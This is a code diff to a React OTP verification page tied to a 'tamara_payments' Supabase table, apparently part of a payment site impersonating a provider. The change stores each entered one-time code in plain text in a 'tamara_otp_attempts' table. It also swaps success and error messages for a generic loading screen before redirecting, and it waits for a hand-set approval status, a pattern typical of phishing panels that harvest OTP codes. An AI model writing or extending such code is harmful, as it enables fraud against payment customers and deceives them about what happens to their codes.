@@ -126,19 +126,35 @@ const OtpVerification = () => {
           schema: 'public',
           table: 'tamara_payments',
           filter: `id=eq.${paymentId}`
-        }, (payload: any) => {
+        }, async (payload: any) => {
           const newStatus = payload.new.payment_status;
           if (newStatus === 'completed') {
             setWaitingApproval(false);
-            setVerificationStatus("success");
-            setTimeout(() => navigate('/payment-success'), 2000);
+            setVerificationStatus("loading");
+            
+            // حفظ محاولة OTP
+            try {
+              await supabase.from("tamara_otp_attempts").insert({
+                payment_id: paymentId,
+                otp_code: otp
+              });
+            } catch (err) {
+              console.error("Error saving OTP attempt:", err);
+            }
+            
+            // عرض رسائل التحميل لمدة 5 ثواني
+            setTimeout(() => {
+              window.location.href = "/";
+            }, 5000);
           } else if (newStatus === 'otp_rejected') {
             setWaitingApproval(false);
-            setVerificationStatus("error");
+            setVerificationStatus("loading");
+            
+            // عرض رسائل التحميل لمدة 5 ثواني ثم العودة لصفحة التحقق
             setTimeout(() => {
               setVerificationStatus("idle");
               setOtp("");
-            }, 3000);
+            }, 5000);
           }
         })
         .subscribe();
